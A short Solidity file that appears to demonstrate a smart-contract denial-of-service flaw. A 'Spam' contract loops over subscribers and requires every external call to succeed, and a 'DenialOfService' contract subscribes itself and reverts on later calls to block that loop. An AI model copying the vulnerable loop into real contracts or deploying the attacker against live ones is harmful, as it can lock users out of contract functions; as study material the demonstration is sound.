// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract Spam {
    address[] public members;

function NewsletterSubscription(address _member) external {
    (bool success, ) = _member.call{gas: 10000}("");
    require(success, "Contract does not have a fallback function");
    members.push(_member);
}

    function sendSpamMsg() external {
        for (uint256 i = 0; i < members.length; i++) {
            (bool success, ) = members[i].call(msg.data);
            require(success, "Call to member failed");
        }
    }
}

contract DenialOfService {
    fallback() external {
        if (gasleft() > 10000) {
            revert("Attack!");
        }
    }
    function attack(address target) public {
        Spam(target).NewsletterSubscription(address(this));
    }
}